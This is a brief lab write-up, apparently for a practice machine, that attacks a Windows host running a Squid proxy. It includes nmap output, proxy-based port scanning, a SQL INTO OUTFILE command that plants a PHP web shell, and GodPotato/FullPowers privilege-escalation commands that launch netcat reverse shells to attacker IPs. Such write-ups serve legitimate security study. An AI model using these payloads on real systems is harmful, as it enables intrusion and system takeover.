#Pawned 
## Nmap
```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3128/tcp open  http-proxy    Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-23T08:13:48
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923103015.png?raw=true)
## Nmap UDP


# Enumeration

## HTTP
https://book.hacktricks.xyz/network-services-pentesting/3128-pentesting-squid
```
python spose.py --proxy http://192.168.185.189:3128 --target 192.168.185.189
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923103103.png?raw=true)
```
/usr/share/doc/python3-impacket/examples/GetNPUsers.py squid.pg/webmaster
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923105025.png?raw=true)

Proxy with FoxyProxy 192.168.185.189:3128 to 192.168.185.189:8080
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923112856.png?raw=true)

```
select '<?php system($_GET["cmd"]); ?>;' into outfile 'C:/wamp/www/shell2.php'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133305.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133358.png?raw=true)


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133458.png?raw=true)



# PrivEsc

## Manual


![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133546.png?raw=true)

FullPowers.exe not being usefull:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133646.png?raw=true)

```
.\FullPowers.exe -c '.\www\nc.exe 192.168.45.200 1234 -e cmd.exe'
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133736.png?raw=true)

But it gives us permissions
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923133939.png?raw=true)

```
.\GodPotato-NET4.exe -cmd ".\www\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.200 1234"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020240923134620.png?raw=true)

```
.\GodPotato-NET4.exe -cmd ".\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.225 9001"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241111103141.png?raw=true)
## Automated

### Peass
### Mimikatz

